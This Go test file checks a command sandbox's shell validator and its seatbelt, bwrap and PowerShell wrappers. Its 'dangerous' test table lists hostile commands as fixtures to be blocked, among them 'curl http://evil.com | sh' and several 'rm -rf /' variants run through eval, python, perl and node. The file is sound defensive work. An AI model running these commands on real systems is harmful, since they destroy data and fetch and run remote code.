package sandbox

import (
	"strings"
	"testing"
)

func TestValidateShellSyntax_Safe(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		{"simple ls", "ls -la"},
		{"cat file", "cat /tmp/foo.txt"},
		{"grep pattern", "grep -r 'pattern' src/"},
		{"git status", "git status"},
		{"npm install", "npm install"},
		{"go build", "go build ./..."},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			safe, reason := ValidateShellSyntax(tt.command)
			if !safe {
				t.Errorf("expected safe, got blocked: %s", reason)
			}
		})
	}
}

func TestValidateShellSyntax_Dangerous(t *testing.T) {
	tests := []struct {
		name    string
		command string
		wantIn  string
	}{
		{"command substitution", "echo $(whoami)", "command substitution"},
		{"backticks", "echo `whoami`", "backtick"},
		{"eval", "eval 'rm -rf /'", "eval"},
		{"python -c", "python -c 'import os; os.system(\"rm -rf /\")'", "python -c"},
		{"perl -e", "perl -e 'system(\"rm -rf /\")'", "perl -e"},
		{"node -e", "node -e 'require(\"child_process\").execSync(\"rm -rf /\")'", "node -e"},
		{"curl pipe sh", "curl http://evil.com | sh", "curl piped to sh"},
		{"rm -rf /", "rm -rf / ", "destructive"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			safe, reason := ValidateShellSyntax(tt.command)
			if safe {
				t.Error("expected command to be blocked")
			}
			if !strings.Contains(strings.ToLower(reason), strings.ToLower(tt.wantIn)) {
				t.Errorf("expected reason containing %q, got %q", tt.wantIn, reason)
			}
		})
	}
}

func TestValidateWithConfig_CustomPattern(t *testing.T) {
	cfg := Config{
		Patterns: []DangerousPattern{
			{Pattern: `\bsudo\b`, Reason: "sudo not allowed"},
		},
	}

	safe, reason := ValidateWithConfig("sudo rm file", cfg)
	if safe {
		t.Error("expected blocked by custom pattern")
	}
	if reason != "sudo not allowed" {
		t.Errorf("expected 'sudo not allowed', got %q", reason)
	}
}

func TestWrapCommand_Darwin(t *testing.T) {
	cfg := Config{
		Filesystem: FSConfig{
			AllowWrite: []string{"/tmp/work"},
			DenyRead:   []string{"/etc/shadow"},
		},
	}

	wrapped, err := WrapCommand("ls -la", cfg, "darwin")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(wrapped, "sandbox-exec") {
		t.Error("expected sandbox-exec wrapper")
	}
	if !strings.Contains(wrapped, "ls -la") {
		t.Error("expected original command in output")
	}
}

func TestWrapCommand_Linux(t *testing.T) {
	cfg := Config{
		Filesystem: FSConfig{
			AllowWrite: []string{"/home/user/project"},
		},
	}

	wrapped, err := WrapCommand("make build", cfg, "linux")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(wrapped, "bwrap") {
		t.Error("expected bwrap wrapper")
	}
	if !strings.Contains(wrapped, "make build") {
		t.Error("expected original command in output")
	}
}

func TestWrapCommand_Blocked(t *testing.T) {
	_, err := WrapCommand("echo $(whoami)", Config{}, "darwin")
	if err == nil {
		t.Error("expected error for blocked command")
	}
}

func TestWrapCommand_UnsupportedPlatform(t *testing.T) {
	wrapped, err := WrapCommand("ls", Config{}, "freebsd")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if wrapped != "ls" {
		t.Errorf("expected unwrapped command, got %q", wrapped)
	}
}

func TestDetectPlatform(t *testing.T) {
	platform := DetectPlatform()
	if platform == "" {
		t.Error("expected non-empty platform")
	}
}

func TestCheckDependencies(t *testing.T) {
	if err := CheckDependencies("darwin"); err != nil {
		t.Errorf("unexpected error for darwin: %v", err)
	}
	if err := CheckDependencies("linux"); err != nil {
		t.Errorf("unexpected error for linux: %v", err)
	}
	if err := CheckDependencies("windows"); err != nil {
		t.Errorf("unexpected error for windows: %v", err)
	}
}

func TestGenerateSeatbeltProfile(t *testing.T) {
	cfg := Config{
		Filesystem: FSConfig{
			AllowWrite: []string{"/tmp"},
			DenyWrite:  []string{"/etc"},
			DenyRead:   []string{"/root"},
		},
	}

	profile := generateSeatbeltProfile(cfg)
	if !strings.Contains(profile, "(version 1)") {
		t.Error("expected version header")
	}
	if !strings.Contains(profile, "(deny default)") {
		t.Error("expected deny default")
	}
	if !strings.Contains(profile, "/tmp") {
		t.Error("expected /tmp in allow write")
	}
	if !strings.Contains(profile, "/etc") {
		t.Error("expected /etc in deny write")
	}
}

func TestGenerateBwrapArgs(t *testing.T) {
	cfg := Config{
		Filesystem: FSConfig{
			AllowWrite: []string{"/home/user"},
			DenyRead:   []string{"/secrets"},
		},
	}

	args := generateBwrapArgs(cfg)
	joined := strings.Join(args, " ")
	if !strings.Contains(joined, "--bind /home/user /home/user") {
		t.Error("expected bind mount for allow write")
	}
	if !strings.Contains(joined, "--tmpfs /secrets") {
		t.Error("expected tmpfs for deny read")
	}
}

// --- New tests ported from TS ---

func TestWrapWindowsSandbox_DenyPaths(t *testing.T) {
	cfg := Config{
		Filesystem: FSConfig{
			DenyWrite: []string{`D:\Sensitive`},
			DenyRead:  []string{`E:\Private`},
		},
	}

	wrapped := wrapWindowsSandbox("dir", cfg)
	if !strings.Contains(wrapped, "powershell") {
		t.Error("expected powershell wrapper")
	}
	if !strings.Contains(wrapped, `D:\Sensitive`) {
		t.Error("expected custom deny write path in checks")
	}
	if !strings.Contains(wrapped, `E:\Private`) {
		t.Error("expected custom deny read path in checks")
	}
	// Default dangerous paths should also be present.
	if !strings.Contains(wrapped, `C:\Windows\System32`) {
		t.Error("expected default System32 deny path")
	}
}

func TestWrapWindowsSandbox_EmptyRestrictions(t *testing.T) {
	// With no custom restrictions AND no default dangerous paths,
	// the function returns unchanged. However, the default dangerous
	// paths are always included (System32, etc.), so the result is
	// always wrapped. Verify the command is present either way.
	cfg := Config{}
	wrapped := wrapWindowsSandbox("echo hello", cfg)
	if !strings.Contains(wrapped, "echo hello") {
		t.Error("expected original command in output")
	}
}

func TestWrapCommand_Windows(t *testing.T) {
	cfg := Config{
		Filesystem: FSConfig{
			DenyWrite: []string{`C:\Secret`},
		},
	}

	wrapped, err := WrapCommand("dir /b", cfg, "windows")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(wrapped, "powershell") {
		t.Error("expected powershell wrapper for windows")
	}
	if !strings.Contains(wrapped, "dir /b") {
		t.Error("expected original command in output")
	}
}

func TestValidateWithConfig_MultipleCustomPatterns(t *testing.T) {
	cfg := Config{
		Patterns: []DangerousPattern{
			{Pattern: `\bsudo\b`, Reason: "sudo not allowed"},
			{Pattern: `\bkubectl\s+delete\b`, Reason: "kubectl delete blocked"},
		},
	}

	// First pattern match.
	safe, reason := ValidateWithConfig("sudo apt install", cfg)
	if safe {
		t.Error("expected blocked by sudo pattern")
	}
	if reason != "sudo not allowed" {
		t.Errorf("expected 'sudo not allowed', got %q", reason)
	}

	// Second pattern match.
	safe, reason = ValidateWithConfig("kubectl delete pod foo", cfg)
	if safe {
		t.Error("expected blocked by kubectl delete pattern")
	}
	if reason != "kubectl delete blocked" {
		t.Errorf("expected 'kubectl delete blocked', got %q", reason)
	}

	// Neither pattern matches.
	safe, _ = ValidateWithConfig("kubectl get pods", cfg)
	if !safe {
		t.Error("expected safe command to pass custom patterns")
	}
}

func TestValidateWithConfig_InvalidRegexIgnored(t *testing.T) {
	cfg := Config{
		Patterns: []DangerousPattern{
			{Pattern: `[invalid`, Reason: "bad regex"},
			{Pattern: `\bfoo\b`, Reason: "foo blocked"},
		},
	}

	// Invalid regex should be silently skipped; valid one still works.
	safe, reason := ValidateWithConfig("foo bar", cfg)
	if safe {
		t.Error("expected blocked by foo pattern")
	}
	if reason != "foo blocked" {
		t.Errorf("expected 'foo blocked', got %q", reason)
	}
}

func TestGenerateSeatbeltProfile_SubpathAllows(t *testing.T) {
	cfg := Config{
		Filesystem: FSConfig{
			AllowWrite: []string{"/tmp/work", "/var/data"},
			DenyRead:   []string{"/root"},
		},
	}

	profile := generateSeatbeltProfile(cfg)
	if !strings.Contains(profile, `(allow file-write* (subpath "/tmp/work"))`) {
		t.Error("expected subpath allow for /tmp/work")
	}
	if !strings.Contains(profile, `(allow file-write* (subpath "/var/data"))`) {
		t.Error("expected subpath allow for /var/data")
	}
	if !strings.Contains(profile, `(deny file-read* (subpath "/root"))`) {
		t.Error("expected subpath deny read for /root")
	}
}

func TestGenerateSeatbeltProfile_DenyOverridesAllow(t *testing.T) {
	cfg := Config{
		Filesystem: FSConfig{
			AllowWrite: []string{"/tmp"},
			DenyWrite:  []string{"/tmp/secret"},
		},
	}

	profile := generateSeatbeltProfile(cfg)
	allowIdx := strings.Index(profile, `(allow file-write* (subpath "/tmp"))`)
	denyIdx := strings.Index(profile, `(deny file-write* (subpath "/tmp/secret"))`)

	if allowIdx < 0 {
		t.Fatal("expected allow write for /tmp")
	}
	if denyIdx < 0 {
		t.Fatal("expected deny write for /tmp/secret")
	}
	// Deny must come after allow to override it in seatbelt.
	if denyIdx < allowIdx {
		t.Error("expected deny to appear after allow (deny overrides)")
	}
}

func TestGenerateBwrapArgs_DefaultMounts(t *testing.T) {
	args := generateBwrapArgs(Config{})
	joined := strings.Join(args, " ")

	if !strings.Contains(joined, "--ro-bind / /") {
		t.Error("expected read-only root bind")
	}
	if !strings.Contains(joined, "--dev /dev") {
		t.Error("expected /dev mount")
	}
	if !strings.Contains(joined, "--proc /proc") {
		t.Error("expected /proc mount")
	}
	if !strings.Contains(joined, "--tmpfs /tmp") {
		t.Error("expected /tmp tmpfs")
	}
}

func TestValidateShellSyntax_EmptyCommand(t *testing.T) {
	safe, _ := ValidateShellSyntax("")
	if !safe {
		t.Error("empty command should be considered safe (no dangerous patterns)")
	}
}

func TestValidateShellSyntax_VeryLongCommand(t *testing.T) {
	// A very long but safe command should still pass.
	long := "echo " + strings.Repeat("a", 10000)
	safe, _ := ValidateShellSyntax(long)
	if !safe {
		t.Error("very long safe command should pass validation")
	}
}

func TestValidateShellSyntax_NestedSubstitution(t *testing.T) {
	safe, reason := ValidateShellSyntax("echo $(echo $(whoami))")
	if safe {
		t.Error("nested command substitution should be blocked")
	}
	if !strings.Contains(strings.ToLower(reason), "command substitution") {
		t.Errorf("expected 'command substitution' in reason, got %q", reason)
	}
}

func TestValidateShellSyntax_UnicodeCommand(t *testing.T) {
	safe, _ := ValidateShellSyntax("echo 'hello \u4e16\u754c'")
	if !safe {
		t.Error("unicode in safe command should pass validation")
	}
}

func TestWrapCommand_FilesystemAndNetworkCombined(t *testing.T) {
	cfg := Config{
		Filesystem: FSConfig{
			AllowWrite: []string{"/tmp/project"},
			DenyRead:   []string{"/etc/shadow"},
		},
		Network: NetConfig{
			AllowedDomains: []string{"api.example.com"},
			BlockedDomains: []string{"evil.com"},
		},
	}

	wrapped, err := WrapCommand("ls -la", cfg, "darwin")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(wrapped, "sandbox-exec") {
		t.Error("expected sandbox-exec wrapper")
	}
	if !strings.Contains(wrapped, "/tmp/project") {
		t.Error("expected allow write path in profile")
	}
	if !strings.Contains(wrapped, "api.example.com") {
		t.Error("expected allowed domain in network rules")
	}
	if !strings.Contains(wrapped, "deny network-outbound") {
		t.Error("expected deny network-outbound when AllowedDomains set")
	}
}
